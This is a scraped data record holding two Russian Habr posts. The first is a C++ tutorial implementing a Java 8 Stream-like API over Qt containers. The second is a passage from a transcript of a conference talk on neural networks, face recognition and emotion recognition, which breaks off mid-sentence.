{"url": "https://habrahabr.ru/post/322924/", "title": ["Простая реализация Stream из Java 8 в С++"], "text": ["Всем привет! В статье будет представлена упрощенная реализацию Stream из Java 8 на С++. Скажу сразу, что: в отличии от Java не используются отложенные вычислений; нет параллельных версий; местами совмещает Stream и Collectors; используются простые и готовые решения от STL, здесь нету чистого ФП, где только рекурсия; не используются техники оптимизации. В этой версии основной упор сделан на то, чтобы быстро и просто сделать велосипед). Про ФП упомянуто по-минимуму (комбинаторам внимание не уделено :)). Интерфейс template <typename Type> class Stream : private StreamImpl<Type> { private: typedef StreamImpl<Type> Parent; public: using Parent::Parent; // конструкторы унаследованы using Parent::data; using Parent::isEmpty; using Parent::count; using Parent::flatMap; using Parent::map; using Parent::reduce; using Parent::filter; using Parent::allMatch; using Parent::noneMatch; using Parent::groupingBy; using Parent::partitionBy; using Parent::minElement; using Parent::maxElement; ~Stream() = default; }; Сюда же можно добавить простые статические проверки типа: static_assert( std::is_copy_assignable<Type>::value, \"Type is not copy assignable\"); static_assert( std::is_default_constructible<Type>::value, \"Type is not default constructible\"); static_assert( std::is_copy_constructible<Type>::value, \"Type is not\"); static_assert(!std::is_volatile<Type>::value, \"volatile data can't be used in Stream\"); static_assert(!std::is_same<Type, std::nullptr_t>::value, \"Stream can't used with nullptr\"); Собственно осталось рассмотреть, что из себя представляет StreamImpl. StreamImpl Stream работает с контейнерами или контейнероподобными типами (типа QString, QByteArray и т.п). Контейнеры в свою очередь могут состоять из контейнеров. Контейнер с неконтейнерными данными будет терминален для функций типа flatMap Определяем StreamImpl: template <typename ContainerType, bool isContainer = Private::is_nested_stl_compatible_container<ContainerType>::value> class StreamImpl; Где is_nested_stl_compatible_container — это вспомогательная метафункция для определения \"контейнерности\" контейнера (в этом ей помогает SFINAE): namespace Private { template <typename ContainerType> class is_iterator { DECLARE_SFINAE_TESTER(Unref, T, t, *t) DECLARE_SFINAE_TESTER(Incr, T, t, ++t) DECLARE_SFINAE_TESTER(Decr, T, t, --t) public: typedef ContainerType Type; static const bool value = GET_SFINAE_RESULT(Unref, Type) && (GET_SFINAE_RESULT(Incr, Type) || GET_SFINAE_RESULT(Decr, Type)); }; template <typename ContainerType> class is_stl_compatible_container { DECLARE_SFINAE_TESTER(Begin, T, t, std::cbegin(t)) DECLARE_SFINAE_TESTER(End, T, t, std::cend(t)) DECLARE_SFINAE_TESTER(ValueType, T, t, sizeof(typename T::value_type)) public: typedef ContainerType Type; static const bool value = GET_SFINAE_RESULT(Begin, Type) && GET_SFINAE_RESULT(End, Type) && GET_SFINAE_RESULT(ValueType, Type); }; template <typename ContainerType> struct is_nested_stl_compatible_container { DECLARE_SFINAE_TESTER(ValueType, T, t, sizeof(typename T::value_type::value_type)) typedef ContainerType Type; static const bool value = is_stl_compatible_container<Type>::value && GET_SFINAE_RESULT(ValueType, Type); }; } Рассмотрим как организацию SFINAE-тестера: #define DECLARE_SFINAE_BASE(Name, ArgType, arg, testexpr) \\ typedef char SuccessType; \\ typedef struct { SuccessType a[2]; } FailureType; \\ template <typename ArgType> \\ static decltype(auto) test(ArgType &&arg) \\ -> decltype(testexpr, SuccessType()); \\ static FailureType test(...); #define DECLARE_SFINAE_TESTER(Name, ArgType, arg, testexpr) \\ struct Name { \\ DECLARE_SFINAE_BASE(Name, ArgType, arg, testexpr) \\ }; #define GET_SFINAE_RESULT(Name, Type) (sizeof(Name::test(std::declval<Type>())) == \\ sizeof(typename Name::SuccessType)) SFINAE-тестер использует как SFINAE по типам, так и SFINAE по выражению. Предположим, что SFINAE-тестер определил что у нас контейнер с контейнерными данными. Контейнер с контейнерными данными StreamImpl для контейнера с контейнерными данными просто наследует от StreamBase — интерфейса, с базовой функциональностью, который будет рассмотрен далее Интерфейс контейнера с контейнерными даннымиtemplate <typename Tp> class StreamImpl<Tp, true> : private StreamBase<Tp> { public: typedef StreamBase<Tp> Parent; typedef Tp ContainerType; using Parent::Parent; using Parent::data; using Parent::flatMap; using Parent::isEmpty; using Parent::count; using Parent::map; using Parent::reduce; using Parent::filter; using Parent::allMatch; using Parent::noneMatch; using Parent::groupingBy; using Parent::partitionBy; using Parent::minElement; using Parent::maxElement; }; Контейнер с неконтейнерными данными StreamImplдля контейнера с неконтейнерными данными предназначен для работы с данными типа QVector<int>, а также для псевдоконтейнеров типа QString, но для работы с std::initalizer: template <typename Tp> class StreamImpl<Tp, false> : private StreamBase<typename Private::select_type<Tp>::type> { public: typedef StreamBase<typename Private::select_type<Tp>::type> Parent; typedef typename Private::select_type<Tp>::type ContainerType; using Parent::Parent; using Parent::data; using Parent::isEmpty; using Parent::count; using Parent::map; using Parent::reduce; using Parent::filter; using Parent::allMatch; using Parent::noneMatch; using Parent::groupingBy; using Parent::partitionBy; using Parent::minElement; using Parent::maxElement; // терминальная функция для flatMap, см. StreamBase::flatMap() auto flatMap() const { return Stream<Tp>(data()); } }; Как видно, реализация идентична StreamImpl<Tp, true> за искючением того, что flatMap терминальна, а базовый класс выводится метафункцией select_type<Tp>::type: template <typename Tp> struct type_to_container; namespace Private { template <typename Tp> struct select_type { using type = std::conditional_t< is_stl_compatible_container<Tp>::value, Tp, typename type_to_container<Tp>::type >; }; } Которая превращает неконтейнер в контейнер с помощью открытой метафункции type_to_container, которому потом и передается std::initalizer_list. Для псевдоконтейнера никакой \"магии\" не используется. По-умолчанию реализация метафункции type_to_container выглядит следующим образом: template <typename Tp> struct type_to_container { using type = QVector<Tp>; }; Рассмотрев детали, перейдем к базе. StreamBase Давайте рассмотрим простой базовый интерфейс. StreamBase работает с контейнерами, элементы которых могут быть контейнерами. Для большей простоты реализации StreamBase копирует исходные данные или перемещает их к себе. Нетерминальные функции возвращают Stream. Вызовы нетерминальных функций можно объединять цепочки и получить что-то вроде монад в ФП. template <typename Container> class StreamBase { Container m_data; public: typedef typename Container::value_type value_type; ~StreamBase() = default; StreamBase(const StreamBase &other) = default; explicit StreamBase(StreamBase &&other) noexcept : m_data(std::move<Container>(other.m_data)) { } explicit StreamBase(const Container &data) : m_data(data) { } explicit StreamBase(Container &&data_) noexcept : m_data(std::move(data_)) { } Можно добавить статическую проверку для контейнера: static_assert( std::is_copy_assignable<Container>::value, \"...\"); static_assert( std::is_default_constructible<Container>::value, \"...\"); static_assert( std::is_copy_constructible<Container>::value, \"...\"); Сервисные функции очень просты: Container data() const { return m_data; } auto cbegin() const noexcept(noexcept(std::cbegin(m_data))) { return std::cbegin(m_data); } auto cend() const noexcept(noexcept(std::cend(m_data))) { return std::cend(m_data); } bool isEmpty() const noexcept(noexcept(cbegin() == cend())) { return cbegin() == cend(); } auto count() const noexcept(noexcept(m_data.size())) { return m_data.size(); } Рассмотрим реализацию map. Суть операции заключается, что к каждому элементу контейнера применяется функция-аппликатор, а результат помещается в другой контейнер. Функция-аппликатор может возвращать значения другого типа. Собственно, вся работа выполняется в вспомогательной функции, которая и возвращает новый контейнер. Этот контейнер будет передан Stream. Аппликатору можно передать дополнительные параметры. template<typename F, typename ...Params> auto map(F &&f, Params&& ...params) const { auto result = map_helper(data(), f, params...); using result_type = decltype(result); return Stream<result_type>(std::forward<result_type>(result)); } Операция filter вызывает для каждого элемента элемента контейнера, функцию-предикат, и если получено значение true, то элемент копируется в другой контейнер. template<typename F, typename ...Params> Stream<Container> filter(F &&f, Params&& ...params) const { Container result; std::copy_if(cbegin(), cend(), std::back_inserter(result), std::bind(f, std::placeholders::_1, params...)); return Stream<decltype(result)>(std::forward<Container>(result)); } Операция reduce (здесь используется свертка слева) более интересна. reduce \"сворачивает\" контейнер в одно значение, двигаясь слева-направо, применяя функцию-оператор к текущему элементу, в качестве первого операнда, а в качестве второго — начальное значение initial, с которым \"сворачиватся\" предыдущие элементы: template<typename F, typename ...Params> value_type reduce(F &&f, const value_type &initial, Params&& ...params) { using namespace std::placeholders; return std::accumulate(cbegin(), cend(), initial, std::bind(f, _1, _2, params...)); } Если у нас контейнер контейнеров с элементами типа T, то в результате применения flatMap будет контейнер с элементами типа T. В возвращаемом значении flatMap вызывается для каждого нового выведенного значения Stream до тех пор пока не дойдет до терминальной версии flatMap. auto flatMap() const { value_type result; std::for_each(cbegin(), cend(), std::bind(append, std::ref(result), std::placeholders::_1)); return Stream<value_type>(std::forward<value_type>(result)).flatMap(); } Поиск минимума и максимума без optional не представялет интереса: Минимум/максимум template<typename F, typename ...Params> value_type maxElement(F &&f, Params ...params) const { auto it = std::max_element(cbegin(), cend(), std::bind(f, std::placeholders::_1, params...)); return it != cend() ? *it : value_type(); } value_type maxElement() const { auto it = std::max_element(cbegin(), cend()); return it != cend() ? *it : value_type(); } template<typename F, typename ...Params> value_type minElement(F &&f, Params ...params) const { auto it = std::min_element(cbegin(), cend(), std::bind(f, std::placeholders::_1, params...)); return it != cend() ? *it : value_type(); } value_type minElement() const { auto it = std::min_element(cbegin(), cend()); return it != cend() ? *it : value_type(); } Аналог distinct тоже очень прост: template<typename F, typename ...Params> Stream<value_type> unique(F &&f, Params ...params) const { QList<value_type> result; std::unique_copy(cbegin(), cend(), std::back_inserter(result), std::bind(f, std::placeholders::_1, params...)); return Stream<value_type>(std::forward<value_type>(result)); } При наличии поиска всех подходящих элементов: template<typename F, typename ...Params> Stream<value_type> allMatch(F &&f, Params ...params) const { return filter(f, params...); } Просто сделать поиск всех неподходящих (через отрицание): template<typename F, typename ...Params> Stream<value_type> noneMatch(F &&f, Params ...params) const { return allMatch(std::bind(std::logical_not<>(), std::bind(f, std::placeholders::_1, params...)) ); } Разбиение элементов: берем два списка – в один кладем, то что удовлетворяет предикату, а в другой, то что нет, а потом в духе оригинала все это помещаем в QMap: template<typename F, typename ...Params> QMap<bool, QList<value_type>> partitionBy(F &&f, Params&& ...params) const { QList<value_type> out_true; QList<value_type> out_false; std::partition_copy(cbegin(), cend(), std::back_inserter(out_true), std::back_inserter(out_false), std::bind(f, std::placeholders::_1, params...)); QMap<bool, QList<value_type>> result { { true, out_true } , { false, out_false } }; return result; } Кластеризация (разбиение на группы): используются две функции clasterizator – для разбиения на группы, а потом над каждым элементом группы выполняется (если задана) функция-finisher. template<typename F, typename ...Params> auto groupingBy(F &&f, Params&& ...params) const { return clasterize(m_data, f, params...); } Сложности только в определении типов: для определения типов возвращаемым значений clasterizator и finisher используется invoke (который будет в С++17), пока его не узаконили пользуемся реализацией, представленной в самом конце: template<typename Claserizer, typename Finisher> auto groupingBy(Claserizer &&clasterizator, Finisher &&finisher) const { using claster_type = decltype(Private::invoke(clasterizator, std::declval<value_type>())); QMap<claster_type, QList<value_type>> clasters = clasterize(data(), clasterizator); using item_type = decltype(Private::invoke( finisher, std::declval<typename decltype(clasters)::mapped_type>())); QMap<claster_type, item_type> result; for(auto it = clasters.cbegin(); it != clasters.cend(); ++it) result[it.key()] = finisher(it.value()); return result; } private: template<typename ContainerType, typename F, typename ...Params> static auto map_helper(const ContainerType &c, F &&f, Params&& ...params) { using ret_type = decltype(Private::invoke(f, std::declval<value_type>(), params...)); using result_type = typename make_templated_type<ContainerType, ret_type>::type; result_type result; std::transform(std::cbegin(c), std::cend(c), std::back_inserter(result), std::bind(f, std::placeholders::_1, params...)); return result; } Кластеризатор выглядит ужасно, но делает простую работу: template<typename ContainerType, typename F, typename ...Params> static auto clasterize(const ContainerType &c, F &&f, Params&& ...params) { using ret_type = decltype(Private::invoke(f, std::declval<value_type>(), params...)); QMap<ret_type, QList<value_type>> result; auto applier = std::bind(f, std::placeholders::_1, params...); auto action = [&result, &applier](const value_type &item) mutable { result[applier(item)].push_back(item); }; std::for_each(c.cbegin(), c.cend(), action); return result; } static value_type& append(value_type &result, const value_type &item) { std::copy(item.cbegin(), item.cend(), std::back_inserter(result)); return result; } }; std::invoke template<typename _Functor, typename... _Args> inline typename enable_if< (!is_member_pointer<_Functor>::value && !is_function<_Functor>::value && !is_function<typename remove_pointer<_Functor>::type>::value), typename result_of<_Functor&(_Args&&...)>::type >::type invoke(_Functor& __f, _Args&&... __args) { return __f(std::forward<_Args>(__args)...); } template<typename _Functor, typename... _Args> inline typename enable_if< (is_member_pointer<_Functor>::value && !is_function<_Functor>::value && !is_function<typename remove_pointer<_Functor>::type>::value), typename result_of<_Functor(_Args&&...)>::type >::type invoke(_Functor& __f, _Args&&... __args) { return std::mem_fn(__f)(std::forward<_Args>(__args)...); } template<typename _Functor, typename... _Args> inline typename enable_if< (is_pointer<_Functor>::value && is_function<typename remove_pointer<_Functor>::type>::value), typename result_of<_Functor(_Args&&...)>::type >::type invoke(_Functor __f, _Args&&... __args) { return __f(std::forward<_Args>(__args)...); } Итог Попробуем применить наши труды: { QStringList x = {\"functional\", \"programming\"}; Stream<QList<QStringList>> stream(QList<QStringList>{x}); qDebug() << stream.flatMap().data(); } QList<QStringList> превратится в QString с содержимым: \"functionalprogramming\". С простым контейнером ничего не случится (здесь std::initalizer_list<int> превратится в QVector<int>) { Stream<int> is({1, 2, 3, 4}); qDebug() << is.flatMap().data(); } А вот с \"непростым\" случится QVector<QVector<int>> превратится в QVector с содержимым (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 100, 111, 112, 113, 114, 115, 116, 117, 118, 119): { QVector<QVector<int>> x = { {0,1,2,3,4,5,6,7,8,9}, {10,11,12,13,14,15,16,17,18,19}, {100,111,112,113,114,115,116,117,118,119}, }; Stream<decltype(x)> t(x); qDebug() << t.flatMap().data(); } Проверим с лямбда-функциями, функциональными объектами и с указателями на функции: Stream<int> t{{1, 20, 300, 4000, 50000}}; qDebug() << t.map(static_cast<QString(*)(int, int)>(&QString::number), 2) .filter(std::bind( std::logical_not<>(), std::bind(QString::isEmpty, std::placeholders::_1)) ) .map(&QString::length) .filter(std::greater<>(), 1) .filter(std::bind( std::logical_and<>(), std::bind(std::greater_equal<>(), std::placeholders::_1, 1), std::bind(std::less_equal<>(), std::placeholders::_1, 100) ) ) .reduce(std::multiplies<>(), 1); Здесь список int-ов превращается в список строк, представляющих int-ы в двоичной системе счисления, потом вычисляются длины строк, из которых выбираются те, что больше 1, а затем с помощью функциональной композиции, созданной с помощью std::bind выбираются элементы в диапазоне [1, 100], а затем эти элементы перемножаются. Жуть! И напоследок, в первой части примера, разбиваем элементы на цифры/нецифры и независимо группируем по значащему байту (QChar::cell), а потом, опять же независимо группируем элементы x по значащему байту и подсчитываем их количество. { QStringList x = {\"flat 0\",\"Map 1\",\"example\"}; Stream<decltype(x)> t(x); Stream<QString> str(t.flatMap().data()); qDebug() << str.partitionBy(static_cast<bool(QChar::*)()const>(&QChar::isDigit)); qDebug() << str.groupingBy(&QChar::cell); auto count = [](const auto &x) { return x.size(); }; qDebug() << str.groupingBy(&QChar::cell, count); } PS: простите за такие примеры… На ночь ничего лучше не придумалось)"], "hab": ["Функциональное программирование", "Ненормальное программирование", "Qt", "Java", "C++"]}{"url": "https://habrahabr.ru/post/322392/", "title": ["Нейронные сети: практическое применение"], "text": ["Наталия Ефремова погружает публику в специфику практического использования нейросетей. Это — расшифровка доклада Highload++. Добрый день, меня зовут Наталия Ефремова, и я research scientist в компании NtechLab. Сегодня я буду рассказывать про виды нейронных сетей и их применение. Сначала скажу пару слов о нашей компании. Компания новая, может быть многие из вас еще не знают, чем мы занимаемся. В прошлом году мы выиграли состязание MegaFace. Это международное состязание по распознаванию лиц. В этом же году была открыта наша компания, то есть мы на рынке уже около года, даже чуть больше. Соответственно, мы одна из лидирующих компаний в распознавании лиц и обработке биометрических изображений. Первая часть моего доклада будет направлена тем, кто незнаком с нейронными сетями. Я занимаюсь непосредственно deep learning. В этой области я работаю более 10 лет. Хотя она появилась чуть меньше, чем десятилетие назад, раньше были некие зачатки нейронных сетей, которые были похожи на систему deep learning. В последние 10 лет deep learning и компьютерное зрение развивались неимоверными темпами. Все, что сделано значимого в этой области, произошло в последние лет 6. Я расскажу о практических аспектах: где, когда, что применять в плане deep learning для обработки изображений и видео, для распознавания образов и лиц, поскольку я работаю в компании, которая этим занимается. Немножко расскажу про распознавание эмоций, какие подходы используются в играх и робототехнике. Также я расскажу про нестандартное применение deep learning, то, что только выходит из научных институтов и пока что еще мало применяется на практике, как это может применяться, и почему это сложно применить. Доклад будет состоять из двух частей. Так как большинство знакомы с нейронными сетями, сначала я быстро расскажу, как работают нейронные сети, что такое биологические нейронные сети, почему нам важно знать, как это работает, что такое искусственные нейронные сети, и какие архитектуры в каких областях применяются. Сразу извиняюсь, я буду немного перескакивать на английскую терминологию, потому что большую часть того, как называется это на русском языке, я даже не знаю. Возможно вы тоже. Итак, первая часть доклада будет посвящена сверточным нейронным сетям. Я расскажу, как работают convolutional neural network (CNN), распознавание изображений на примере из распознавания лиц. Немного расскажу про рекуррентные нейронные сети recurrent neural network (RNN) и обучение с подкреплением на примере систем deep learning. В качестве нестандартного применения нейронных сетей я расскажу о том, как CNN работает в медицине для распознавания воксельных изображений, как используются нейронные сети для распознавания бедности в Африке. Что такое нейронные сети Прототипом для создания нейронных сетей послужили, как это ни странно, биологические нейронные сети. Возможно, многие из вас знают, как программировать нейронную сеть, но откуда она взялась, я думаю, некоторые не знают. Две трети всей сенсорной информации, которая к нам попадает, приходит с зрительных органов восприятия. Более одной трети поверхности нашего мозга заняты двумя самыми главными зрительными зонами — дорсальный зрительный путь и вентральный зрительный путь. Дорсальный зрительный путь начинается в первичной зрительной зоне, в нашем темечке и продолжается наверх, в то время как вентральный путь начинается на нашем затылке и заканчивается примерно за ушами. Все важное распознавание образов, которое у нас происходит, все смыслонесущее, то что мы осознаём, проходит именно там же, за ушами. Почему это важно? Потому что часто нужно для понимания нейронных сетей. Во-первых, все об этом рассказывают, и я уже привыкла что так происходит, а во-вторых, дело в том, что все области, которые используются в нейронных сетях для распознавания образов, пришли к нам именно из вентрального зрительного пути, где каждая маленькая зона отвечает за свою строго определенную функцию. Изображение попадает к нам из сетчатки глаза, проходит череду зрительных зон и заканчивается в височной зоне. В далекие 60-е годы прошлого века, когда только начиналось изучение зрительных зон мозга, первые эксперименты проводились на животных, потому что не было fMRI. Исследовали мозг с помощью электродов, вживлённых в различные зрительные зоны. Первая зрительная зона была исследована Дэвидом Хьюбелем и Торстеном Визелем в 1962 году. Они проводили эксперименты на кошках. Кошкам показывались различные движущиеся объекты. На что реагировали клетки мозга, то и было тем стимулом, которое распознавало животное. Даже сейчас многие эксперименты проводятся этими драконовскими способами. Но тем не менее это самый эффективный способ узнать, что делает каждая мельчайшая клеточка в нашем мозгу. Таким же способом были открыты еще многие важные свойства зрительных зон, которые мы используем в deep learning сейчас. Одно из важнейших свойств — это увеличение рецептивных полей наших клеток по мере продвижения от первичных зрительных зон к височным долям, то есть более поздним зрительным зонам. Рецептивное поле — это та часть изображения, которую обрабатывает каждая клеточка нашего мозга. У каждой клетки своё рецептивное поле. Это же свойство сохраняется и в нейронных сетях, как вы, наверное, все знаете. Также с возрастанием рецептивных полей увеличиваются сложные стимулы, которые обычно распознают нейронные сети. Здесь вы видите примеры сложности стимулов, различных двухмерных форм, которые распознаются в зонах V2, V4 и различных частях височных полей у макак. Также проводятся некоторое количество экспериментов на МРТ. Здесь вы видите, как проводятся такие эксперименты. Это 1 нанометровая часть зон IT cortex'a мартышки при распознавании различных объектов. Подсвечено то, где распознается. Просуммируем. Важное свойство, которое мы хотим перенять у зрительных зон — это то, что возрастают размеры рецептивных полей, и увеличивается сложность объектов, которые мы распознаем. Компьютерное зрение До того, как мы научились это применять к компьютерному зрению — в общем, как такового его не было. Во всяком случае, оно работало не так хорошо, как работает сейчас. Все эти свойства мы переносим в нейронную сеть, и вот оно заработало, если не включать небольшое отступление к датасетам, о котором расскажу попозже. Но сначала немного о простейшем перцептроне. Он также образован по образу и подобию нашего мозга. Простейший элемент напоминающий клетку мозга — нейрон. Имеет входные элементы, которые по умолчанию располагаются слева направо, изредка снизу вверх. Слева это входные части нейрона, справа выходные части нейрона. Простейший перцептрон способен выполнять только самые простые операции. Для того, чтобы выполнять более сложные вычисления, нам нужна структура с большим количеством скрытых слоёв. В случае компьютерного зрения нам нужно еще больше скрытых слоёв. И только тогда система будет осмысленно распознавать то, что она видит. Итак, что происходит при распознавании изображения, я расскажу на примере лиц. Для нас посмотреть на эту картинку и сказать, что на ней изображено именно лицо статуи, достаточно просто. Однако до 2010 года для компьютерного зрения это было невероятно сложной задачей. Те, кто занимался этим вопросом до этого времени, наверное, знают насколько тяжело было описать объект, который мы хотим найти на картинке без слов. Нам нужно это было сделать каким-то геометрическим способом, описать объект, описать взаимосвязи объекта, как могут эти части относиться к друг другу, потом найти это изображение на объекте, сравнить их и получить, что мы распознали плохо. Обычно это было чуть лучше, чем подбрасывание монетки. Чуть лучше, чем chance level. Сейчас это происходит не так. Мы разбиваем наше изображение либо на пиксели, либо на некие патчи: 2х2, 3х3, 5х5, 11х11 пикселей — как удобно создателям системы, в которой они служат входным слоем в нейронную сеть. Сигналы с этих входных слоёв передаются от слоя к слою с помощью синапсов, каждый из слоёв имеет свои определенные коэффициенты. Итак, мы передаём от слоя к слою, от слоя к слою, пока мы не получим, что мы распознали лицо. Условно все эти части можно разделить на три класса, мы их обозначим X, W и Y, где Х — это наше входное изображение, Y — это набор лейблов, и нам нужно получить наши веса. Как мы вычислим W? При наличии нашего Х и Y это, кажется, просто. Однако то, что обозначено звездочкой, очень сложная нелинейная операция, которая, к сожалению, не имеет обратной. Даже имея 2 заданных компоненты уравнения, очень сложно ее вычислить. Поэтому нам нужно постепенно, методом проб и ошибок, подбором веса W сделать так, чтобы ошибка максимально уменьшилась, желательно, чтобы стала равной нулю. Этот процесс происходит итеративно, мы постоянно уменьшаем, пока не находим то значение веса W, которое нас достаточно устроит. К слову, ни одна нейронная сеть, с которой я работала, не достигала ошибки, равной нулю, но работала при этом достаточно хорошо. Перед вами первая сеть, которая победила на международном соревновании ImageNet в 2012 году. Это так называемый AlexNet. Это сеть, которая впервые заявила о себе, о том, что существует convolutional neural networks и с тех самых пор на всех международных состязаниях уже convolutional neural nets не сдавали своих позиций никогда. Несмотря на то, что эта сеть достаточно мелкая (в ней всего 7 скрытых слоёв), она содержит 650 тысяч нейронов с 60 миллионами параметров. Для того, чтобы итеративно научиться находить нужные веса, нам нужно очень много примеров. Нейронная сеть учится на примере картинки и лейбла. Как нас в детстве учат «это кошка, а это собака», так же нейронные сети обучаются на большом количестве картинок. Но дело в том, что до 2010 не существовало достаточно большого data set’a, который способен был бы научить такое количество параметров распознавать изображения. Самые большие базы данных, которые существовали до этого времени: PASCAL VOC, в который было всего 20 категорий объектов, и Caltech 101, который был разработан в California Institute of Technology. В последнем была 101 категория, и это было много. Тем же, кто не сумел найти свои объекты ни в одной из этих баз данных, приходилось стоить свои базы данных, что, я скажу, страшно мучительно. Однако, в 2010 году появилась база ImageNet, в которой было 15 миллионов изображений, разделённые на 22 тысячи категорий. Это решило нашу проблему обучения нейронных сетей. Сейчас все желающие, у кого есть какой-либо академический адрес, могут спокойно зайти на сайт базы, запросить доступ и получить эту базу для тренировки своих нейронных сетей. Они отвечают достаточно быстро, по-моему, на следующий день. По сравнению с предыдущими data set’ами, это очень большая база данных. На примере видно, насколько было незначительно все то, что было до неё. Одновременно с базой ImageNet появилось соревнование ImageNet, международный challenge, в котором все команды, желающие посоревноваться, могут принять участие. В этом году победила сеть, созданная в Китае, в ней было 269 слоёв. Не знаю, сколько параметров, подозреваю, тоже много. Архитектура глубинной нейронной сети Условно ее можно разделить на 2 части: те, которые учатся, и те, которые не учатся. Чёрным обозначены те части, которые не учатся, все остальные слои способны обучаться. Существует множество определений того, что находится внутри каждого сверточного слоя. Одно из принятых обозначений — один слой с тремя компонентами разделяют на convolution stage, detector stage и pooling stage. Не буду вдаваться в детали, еще будет много докладов, в которых подробно рассмотрено, как это работает. Расскажу на примере. Поскольку организаторы просили меня не упоминать много формул, я их выкинула совсем. Итак, входное изображение попадает в сеть слоёв, которые можно назвать фильтрами разного размера и разной сложности элементов, которые они распознают. Эти фильтры составляют некий свой индекс или набор признаков, который потом попадает в классификатор. Обычно это либо SVM, либо MLP — многослойный перцептрон, кому что удобно. По образу и подобию с биологической нейронной сетью объекты распознаются разной сложности. По мере увеличения количества слоёв это все потеряло связь с cortex’ом, поскольку там ограничено количество зон в нейронной сети. 269 или много-много зон абстракции, поэтому сохраняется только увеличение сложности, количества элементов и рецептивных полей. Если рассмотреть на примере распознавания лиц, то у нас рецептивное поле первого слоя будет маленьким, потом чуть побольше, побольше, и так до тех пор, пока наконец мы не сможем распознавать уже лицо целиком. С точки зрения того, что находится у нас внутри фильтров, сначала будут наклонные палочки плюс немного цвета, затем части лиц, а потом уже целиком лица будут распознаваться каждой клеточкой слоя. Есть люди, которые утверждают, что человек всегда распознаёт лучше, чем сеть. Так ли это? В 2014 году ученые решили проверить, насколько мы хорошо распознаем в сравнении с нейронными сетями. Они взяли 2 самые лучшие на данный момент сети — это AlexNet и сеть Мэттью Зиллера и Фергюса, и сравнили с откликом разных зон мозга макаки, которая тоже была научена распознавать какие-то объекты. Объекты были из животного мира, чтобы обезьяна не запуталась, и были проведены эксперименты, кто же распознаёт лучше. Так как получить отклик от мартышки внятно невозможно, ей вживили электроды и мерили непосредственно отклик каждого нейрона. Оказалось, что в нормальных условиях клетки мозга реагировали так же хорошо, как и state of the art model на тот момент, то есть сеть Мэттью Зиллера. Однако при увеличении скорости показа объектов, увеличении количества шумов и объектов на изображении скорость распознавания и его качество нашего мозга и мозга приматов сильно падают. Даже самая простая сверточная нейронная сеть распознаёт объекты лучше. То есть официально нейронные сети работают лучше, чем наш мозг. Классические задачи сверточных нейронных сетей Их на самом деле не так много, они относятся к трём классам. Среди них — такие задачи, как идентификация объекта, семантическая сегментация, распознавание лиц, распознавание частей тела человека, семантическое определение границ, выделение объектов внимания на изображении и выделение нормалей к поверхности. Их условно можно разделить на 3 уровня: от самых низкоуровневых задач до самых высокоуровневых задач. На примере этого изображения рассмотрим, что делает каждая из задач. Определение границ — это самая низкоуровневая задача, для которой уже классически применяются сверточные нейронные сети. Определение вектора к нормали позволяет нам реконструировать трёхмерное изображение из двухмерного. Saliency, определение объектов внимания — это то, на что обратил бы внимание человек при рассмотрении этой картинки. Семантическая сегментация позволяет разделить объекты на классы по их структуре, ничего не зная об этих объектах, то есть еще до их распознавания. Семантическое выделение границ — это выделение границ, разбитых на классы. Выделение частей тела человека. И самая высокоуровневая задача — распознавание самих объектов, которое мы сейчас рассмотрим на примере распознавания лиц. Распознавание лиц Первое, что мы делаем — пробегаем face detector'ом по изображению для того, чтобы найти лицо. Далее мы нормализуем, центрируем лицо и запускаем его на обработку в нейронную сеть. После чего получаем набор или вектор признаков однозначно описывающий фичи этого лица. Затем мы можем этот вектор признаков сравнить со всеми векторами признаков, которые хранятся у нас в базе данных, и получить отсылку на конкретного человека, на его имя, на его профиль — всё, что у нас может храниться в базе данных. Именно таким образом работает наш продукт FindFace — это бесплатный сервис, который помогает искать профили людей в базе «ВКонтакте». Кроме того, у нас есть API для компаний, которые хотят попробовать наши продукты. Мы предоставляем сервис по детектированию лиц, по верификации и по идентификации пользователей. Сейчас у нас разработаны 2 сценария. Первый — это идентификация, поиск лица по базе данных. Второе — это верификация, это сравнение двух изображений с некой вероятностью, что это один и тот же человек. Кроме того, у нас сейчас в разработке распознавание эмоций, распознавание изображений на видео и liveness detection — это понимание, живой ли человек перед камерой или фотография. Немного статистики. При идентификации, при поиске по 10 тысячам фото у нас точность около 95% в зависимости от качества базы, 99% точность верификации. И помимо этого данный алгоритм очень устойчив к изменениям — нам необязательно смотреть в камеру, у нас могут быть некие загораживающие предметы: очки, солнечные очки, борода, медицинская маска. В некоторых случаях мы можем победить даже такие невероятные сложности для компьютерного зрения, как и очки, и маска. Очень быстрый поиск, затрачивается 0,5 секунд на обработку 1 миллиарда фотографий. Нами разработан уникальный индекс быстрого поиска. Также мы можем работать с изображениями низкого качества, полученных с CCTV-камер. Мы можем обрабатывать это все в режиме реального времени. Можно загружать фото через веб-интерфейс, через Android, iOS и производить поиск по 100 миллионам пользователей и их 250 миллионам фотографий. Как я уже говорила мы заняли первое место на MegaFace competition — аналог для ImageNet, но для распознавания лиц. Он проводится уже несколько лет, в прошлом году мы были лучшими среди 100 команд со всего мира, включая Google. Рекуррентные нейронные сети Recurrent neural networks мы используем тогда, когда нам недостаточно распознавать только изображение. В тех случаях, когда нам важно соблюдать последовательность, нам нужен порядок того, что у нас происходит, мы используем обычные рекуррентные нейронные сети. Это применяется для распознавания естественного языка, для обработки видео, даже используется для распознавания изображений. Про распознавание естественного языка я рассказывать не буду — после моего доклада еще будут два, которые будут направлены на распознавание естественного языка. Поэтому я расскажу про работу рекуррентных сетей на примере распознавания эмоций. Что такое рекуррентные нейронные сети? Это примерно то же самое, что и обычные нейронные сети, но с обратной связью. Обратная связь нам нужна, чтобы передавать на вход нейронной сети или на какой-то из ее слоев предыдущее состояние системы. Предположим, мы обрабатываем эмоции. Даже в улыбке — одной из самых простых эмоций — есть несколько моментов: от нейтрального выражения лица до того момента, когда у нас будет полная улыбка. Они идут друг за другом последовательно. Чтоб это хорошо понимать, нам нужно уметь наблюдать за тем, как это происходит, передавать то, что было на предыдущем кадре в следующий шаг работы системы. В 2005 году на состязании Emotion Recognition in the Wild специально для распознавания эмоций команда из Монреаля представила рекуррентную систему, которая выглядела очень просто. У нее было всего несколько свёрточных слоев, и она работала исключительно с видео. В этом году они добавили также распознавание аудио и cагрегировали покадровые данные, которые получаются из convolutional neural networks, данные аудиосигнала с работой рекуррентной нейронной сети (с возвратом состояния) и получили первое место на состязании. Обучение с подкреплением Следующий тип нейронных сетей, который очень часто используется в последнее время, но не получил такой широкой огласки, как предыдущие 2 типа — это deep reinforcement learning, обучение с подкреплением. Дело в том, что в предыдущих двух случаях мы используем базы данных. У 